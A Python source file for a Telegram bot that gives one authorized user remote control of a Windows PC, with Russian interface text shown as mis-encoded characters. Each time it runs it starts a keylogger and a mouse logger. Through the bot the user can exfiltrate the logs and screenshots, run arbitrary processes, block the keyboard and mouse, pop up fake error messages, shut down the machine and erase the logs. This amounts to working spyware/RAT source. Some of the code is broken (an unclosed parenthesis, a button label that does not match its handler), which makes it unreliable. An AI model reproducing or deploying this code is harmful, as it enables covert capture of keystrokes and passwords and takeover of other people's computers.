import telebot
from datetime import datetime
import psutil
import platform
import mss
import os
import subprocess
import webbrowser
import pynput.keyboard
import pynput.mouse
import ctypes

bot = telebot.TeleBot(TOKEN)

AUTHORIZED_USERS = {TELEGRAM_ID}
startup_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
startup_message = f"üíª –ö–æ–º–ø—å—é—Ç–µ—Ä –≤–∫–ª—é—á–µ–Ω. –í—Ä–µ–º—è –≤–∫–ª—é—á–µ–Ω–∏—è: {startup_time}"

base_path = "C:/bot" #–û–ë–ù–û–í–ò–¢–ï –ü–£–¢–ò –ï–°–õ–ò –ù–ê–î–û
log_file = os.path.join(base_path, 'activity_log.txt')
screenshot_file = os.path.join(base_path, 'screenshot.png')

def ensure_base_path_exists():
    if not os.path.exists(base_path):
        os.makedirs(base_path

ensure_base_path_exists()

def block_input(state):
    ctypes.windll.user32.BlockInput(state)

def log_action(action):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a') as f:
        f.write(f"{timestamp} - {action}\n")

def on_key_press(key):
    try:
        log_action(f"Key pressed: {key.char}")
    except AttributeError:
        log_action(f"Special key pressed: {key}")

def start_keylogger():
    listener = pynput.keyboard.Listener(on_press=on_key_press)
    listener.start()

def on_click(x, y, button, pressed):
    if pressed:
        log_action(f"Mouse clicked at ({x}, {y}) with {button}")

def start_mouse_logger():
    mouse_listener = pynput.mouse.Listener(on_click=on_click)
    mouse_listener.start()

def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("üñ•Ô∏è –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"),
        telebot.types.KeyboardButton("üîí –û—Ç–∫–ª—é—á–∏—Ç—å –∫–ª–∞–≤—É –∏ –º—ã—à—å (–ù–∞–≤—Å–µ–≥–¥–∞)"),
        telebot.types.KeyboardButton("üñºÔ∏è –°–∫—Ä–∏–Ω—à–æ—Ç"),
        telebot.types.KeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É"),
        telebot.types.KeyboardButton("‚ùå –§–µ–π–∫–æ–≤–∞—è –æ—à–∏–±–∫–∞"),
        telebot.types.KeyboardButton("‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å—ã"),
        telebot.types.KeyboardButton("üîÑ –ó–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å"),
        telebot.types.KeyboardButton("üõë –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å"),
        telebot.types.KeyboardButton("üîå –í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö"),
        telebot.types.KeyboardButton("üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö"),
        telebot.types.KeyboardButton("üìú –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏"),
        telebot.types.KeyboardButton("üóëÔ∏è –°—Ç–µ—Ä–µ—Ç—å –ª–æ–≥–∏"),
        telebot.types.KeyboardButton("üíÄ –°–∞–º–æ—É–±–∏–π—Å—Ç–≤–æ")
    ]
    markup.add(*buttons)
    return markup

for user_id in AUTHORIZED_USERS:
    bot.send_message(user_id, startup_message)
    main_menu()

user_states = {}

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS


@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "üëã –ü—Ä–∏–≤–µ—Ç! –£ –≤–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.", reply_markup=main_menu())
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.")

@bot.message_handler(func=lambda message: message.text == "üìú –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏")
def send_logs(message):
    if is_authorized(message.from_user.id):
        with open(log_file, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="üìú –í–æ—Ç –≤–∞—à–∏ –ª–æ–≥–∏:")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üñºÔ∏è –°–∫—Ä–∏–Ω—à–æ—Ç")
def send_screenshot(message):
    if is_authorized(message.from_user.id):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with mss.mss() as sct:
            filename = sct.shot(output=screenshot_file)
        with open(screenshot_file, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=f"üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å–¥–µ–ª–∞–Ω: {timestamp}")
        log_action("Screenshot taken")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üñ•Ô∏è –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è")
def send_system_info(message):
    if is_authorized(message.from_user.id):
        uname = platform.uname()

        # –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ
        system_info = f"""üñ•Ô∏è –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:

        üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞: {uname.system}
        üåê –£–∑–µ–ª: {uname.node}
        üóÇÔ∏è –í—ã–ø—É—Å–∫: {uname.release}
        üìÖ –í–µ—Ä—Å–∏—è: {uname.version}
        """

        # –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        uptime = datetime.now() - bt
        uptime_info = f"‚è≥ –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã: {uptime}"

        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–º—è—Ç–∏
        memory = psutil.virtual_memory()
        memory_info = f"""üî¢ –ü–∞–º—è—Ç—å:
        - –û–±—â–∞—è –ø–∞–º—è—Ç—å: {memory.total / (1024 ** 3):.2f} –ì–ë
        - –î–æ—Å—Ç—É–ø–Ω–∞—è –ø–∞–º—è—Ç—å: {memory.available / (1024 ** 3):.2f} –ì–ë
        - –ò—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –ø–∞–º—è—Ç—å: {memory.used / (1024 ** 3):.2f} –ì–ë
        - –ü—Ä–æ—Ü–µ–Ω—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è: {memory.percent}%
        """

        # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–∏—Å–∫–µ
        disk = psutil.disk_usage('/')
        disk_info = f"""üíæ –î–∏—Å–∫:
        - –û–±—â–∏–π –æ–±—ä–µ–º: {disk.total / (1024 ** 3):.2f} –ì–ë
        - –ò—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –æ–±—ä–µ–º: {disk.used / (1024 ** 3):.2f} –ì–ë
        - –°–≤–æ–±–æ–¥–Ω—ã–π –æ–±—ä–µ–º: {disk.free / (1024 ** 3):.2f} –ì–ë
        - –ü—Ä–æ—Ü–µ–Ω—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è: {disk.percent}%
        """

        # –°–≤–æ–¥–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        info_message = f"{system_info}\n{memory_info}\n{disk_info}\n{uptime_info}"

        bot.send_message(message.chat.id, f"```\n{info_message}\n```", parse_mode='Markdown', reply_markup=main_menu())
        log_action("System information requested")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å—ã")
def send_process_list(message):
    if is_authorized(message.from_user.id):
        page = 1
        processes, total_pages = get_processes(page)
        process_message = "\n".join([f"üÜî {p['pid']}: {p['name']} (CPU: {p['cpu_percent']}%)" for p in processes])
        process_message = f"üìù –ü—Ä–æ—Ü–µ—Å—Å—ã (—Å—Ç—Ä–∞–Ω–∏—Ü–∞ {page}/{total_pages}):\n\n{process_message}"

        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(
            telebot.types.InlineKeyboardButton("‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data=f"prev_{page}"),
            telebot.types.InlineKeyboardButton("–í–ø–µ—Ä–µ–¥ ‚ñ∂Ô∏è", callback_data=f"next_{page}")
        )

        bot.send_message(message.chat.id, process_message, reply_markup=markup)
        log_action("Process list requested")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üîÑ –ó–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å")
def prompt_start_process(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_process_name'
        bot.reply_to(message, "üìù –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å.")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üõë –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å")
def prompt_kill_process(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_pid'
        bot.reply_to(message, "üìù –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ PID –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ –∑–∞–≤–µ—Ä—à–∏—Ç—å.")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üåê –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É")
def prompt_open_link(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_link'
        bot.reply_to(message, "üìù –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å –≤ –±—Ä–∞—É–∑–µ—Ä–µ.")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üîå –í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö")
def shutdown_system(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "üîå –í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
        log_action("System shutdown initiated")
        if platform.system() == "Windows":
            os.system("shutdown /s /t 1")
        elif platform.system() in ["Linux", "Darwin"]:
            os.system("sudo shutdown -h now")
        else:
            bot.reply_to(message, "‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞. –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤—ã–∫–ª—é—á–µ–Ω–∏–µ.")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üóëÔ∏è –°—Ç–µ—Ä–µ—Ç—å –ª–æ–≥–∏")
def clear_logs(message):
    if is_authorized(message.from_user.id):
        try:
            if os.path.exists(log_file):
                os.remove(log_file)
                bot.reply_to(message, "üóëÔ∏è –õ–æ–≥–∏ —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω—ã.")
            else:
                bot.reply_to(message, "üìÇ –õ–æ–≥–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
        except Exception as e:
            bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ª–æ–≥–æ–≤: {e}")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö")
def restart_system(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
        log_action("System restart initiated")
        if platform.system() == "Windows":
            os.system("shutdown /r /t 1")
        elif platform.system() in ["Linux", "Darwin"]:
            os.system("sudo reboot")
        else:
            bot.reply_to(message, "‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞. –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É.")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "‚ùå –§–µ–π–∫–æ–≤–∞—è –æ—à–∏–±–∫–∞")
def prompt_fake_error(message):
    if is_authorized(message.from_user.id):
        user_states[message.from_user.id] = 'waiting_for_error_message'
        bot.reply_to(message, "üìù –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è —Ñ–µ–π–∫–æ–≤–æ–π –æ—à–∏–±–∫–∏.")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[
    message.from_user.id] == 'waiting_for_process_name')
def handle_start_process(message):
    if is_authorized(message.from_user.id):
        process_name = message.text
        try:
            subprocess.Popen(process_name)
            bot.reply_to(message, f"üöÄ –ü—Ä–æ—Ü–µ—Å—Å '{process_name}' —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω.")
            log_action(f"Process started: {process_name}")
        except Exception as e:
            bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")
        finally:
            del user_states[message.from_user.id]
            bot.send_message(message.chat.id, "üîÑ –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", reply_markup=main_menu())
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(
    func=lambda message: message.from_user.id in user_states and user_states[message.from_user.id] == 'waiting_for_pid')
def handle_kill_process(message):
    if is_authorized(message.from_user.id):
        try:
            pid = int(message.text)
            process = psutil.Process(pid)
            process.terminate()
            bot.reply_to(message, f"üõë –ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω.")
            log_action(f"Process terminated: PID {pid}")
        except psutil.NoSuchProcess:
            bot.reply_to(message, f"‚ùå –ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        except Exception as e:
            bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")
        finally:
            del user_states[message.from_user.id]
            bot.send_message(message.chat.id, "üîÑ –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", reply_markup=main_menu())
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[
    message.from_user.id] == 'waiting_for_link')
def handle_open_link(message):
    if is_authorized(message.from_user.id):
        link = message.text
        try:
            webbrowser.open(link)
            bot.reply_to(message, f"üåê –°—Å—ã–ª–∫–∞ '{link}' –æ—Ç–∫—Ä—ã—Ç–∞ –≤ –±—Ä–∞—É–∑–µ—Ä–µ.")
            log_action(f"Link opened: {link}")
        except Exception as e:
            bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Å—ã–ª–∫–∏: {e}")
        finally:
            del user_states[message.from_user.id]
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[
    message.from_user.id] == 'waiting_for_error_message')
def handle_fake_error(message):
    if is_authorized(message.from_user.id):
        error_message = message.text
        if platform.system() == "Windows":
            subprocess.run(["msg", "*", error_message])
            log_action(f"Fake error shown with message: {error_message}")
        else:
            bot.reply_to(message, "‚ùì –§–µ–π–∫–æ–≤—ã–µ –æ—à–∏–±–∫–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows.")
        del user_states[message.from_user.id]
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("prev_") or call.data.startswith("next_"))
def process_pagination(call):
    if is_authorized(call.from_user.id):
        page = int(call.data.split('_')[1])
        direction = call.data.split('_')[0]

        if direction == "next":
            page += 1
        elif direction == "prev":
            page -= 1

        processes, total_pages = get_processes(page)

        if page > total_pages:
            page = 1
        elif page < 1:
            page = total_pages

        process_message = "\n".join([f"üÜî {p['pid']}: {p['name']} (CPU: {p['cpu_percent']}%)" for p in processes])
        process_message = f"üìù –ü—Ä–æ—Ü–µ—Å—Å—ã (—Å—Ç—Ä–∞–Ω–∏—Ü–∞ {page}/{total_pages}):\n\n{process_message}"

        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(
            telebot.types.InlineKeyboardButton("‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data=f"prev_{page}"),
            telebot.types.InlineKeyboardButton("–í–ø–µ—Ä–µ–¥ ‚ñ∂Ô∏è", callback_data=f"next_{page}")
        )

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=process_message,
                              reply_markup=markup)
    else:
        bot.answer_callback_query(call.id, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: message.text == "üîí –û—Ç–∫–ª—é—á–∏—Ç—å –∫–ª–∞–≤—É –∏ –º—ã—à—å")
def disable_input(message):
    if is_authorized(message.from_user.id):
        try:
            block_input(True)
            bot.reply_to(message, "üîí –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –∏ –º—ã—à—å –æ—Ç–∫–ª—é—á–µ–Ω—ã.")
        except Exception as e:
            bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏ –≤–≤–æ–¥–∞: {e}")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

def get_processes(page: int, per_page: int = 15):
    processes = [proc.info for proc in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
    processes.sort(key=lambda x: x['cpu_percent'], reverse=True)

    total_pages = (len(processes) + per_page - 1) // per_page
    start = (page - 1) * per_page
    end = start + per_page
    processes_on_page = processes[start:end]

    return processes_on_page, total_pages

@bot.message_handler(func=lambda message: message.text == "üíÄ –°–∞–º–æ—É–±–∏–π—Å—Ç–≤–æ")
def bot_suicide(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –∑–∞–≤–µ—Ä—à–∏—Ç—å —Ä–∞–±–æ—Ç—É –±–æ—Ç–∞? –ù–∞–ø–∏—à–∏—Ç–µ '–î–∞' –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è...")
        user_states[message.from_user.id] = 'confirming_suicide'
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == 'confirming_suicide')
def confirm_suicide(message):
    if message.text.lower() in ['–¥–∞', 'yes', '–¥', 'y']:
        bot.reply_to(message, "üíÄ –ë–æ—Ç –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Å–≤–æ—é —Ä–∞–±–æ—Ç—É...")
        os._exit(0)  # –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã –±–æ—Ç–∞
    else:
        bot.reply_to(message, "‚ùå –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–µ –ø–æ–ª—É—á–µ–Ω–æ. –ë–æ—Ç –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Ä–∞–±–æ—Ç—É.")
    del user_states[message.from_user.id]

@bot.message_handler(func=lambda message: True)
def handle_unrecognized(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "‚ùì –ö–æ–º–∞–Ω–¥–∞ –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –æ–¥–Ω—É –∏–∑ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–Ω—ã—Ö –æ–ø—Ü–∏–π.")
    else:
        bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–∏–º —Ñ—É–Ω–∫—Ü–∏—è–º.")

start_keylogger()
start_mouse_logger()

bot.polling()

